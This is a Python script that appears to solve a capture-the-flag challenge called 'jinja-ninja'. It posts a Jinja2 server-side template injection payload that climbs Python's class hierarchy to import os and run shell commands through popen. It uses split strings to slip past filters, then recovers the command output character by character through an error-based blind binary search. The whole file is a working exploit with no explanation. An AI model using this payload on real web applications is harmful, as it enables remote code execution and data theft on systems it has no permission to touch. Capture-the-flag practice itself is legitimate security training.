import requests
import math
import sys

def is_char_at_less_than(cmd, ich, ch):
    template = '''
        {% for x in ().__class__.__base__.__subclasses__() %}
            {% if "warni"+"ng" in x.__name__ %}
                {% if x()._module.__builtins__['__imp' + 'ort__']('o'+'s').popen("''' + cmd + '''").read()[''' + str(ich) + '''] < "''' + ch + '''" %}
                    {% for a in [1/0] %}
                    {% endfor %}
                {% endif %}
            {% endif %}
        {% endfor %}
    '''

    r = requests.post('https://jinja-ninja.secchallenge.crysys.hu/submit', data={
        "name": template,
        "email": "a",
        "faction": "4",
        "profession": "c",
        "preferences": "c",
    })
    resp = r.text
    r = 'Something went wrong' in resp
    return r


def get_char_at(cmd, ich):
    lo = 19
    hi = 127

    while hi - lo > 1:
        m = math.floor((hi + lo) / 2)

        sys.stdout.write(chr(m))
        sys.stdout.write('\u001B[1D')
        sys.stdout.flush()
        if is_char_at_less_than(cmd, ich, chr(m)):
            hi = m
        else:
            lo = m

    sys.stdout.write(chr(lo))
    sys.stdout.flush()
    return chr(lo)


def solve():
    flag = ''

    while not flag.endswith('}'):
        flag += get_char_at('cat fla*', len(flag))

    print()
    return flag


if __name__ == "__main__":
    print(solve())
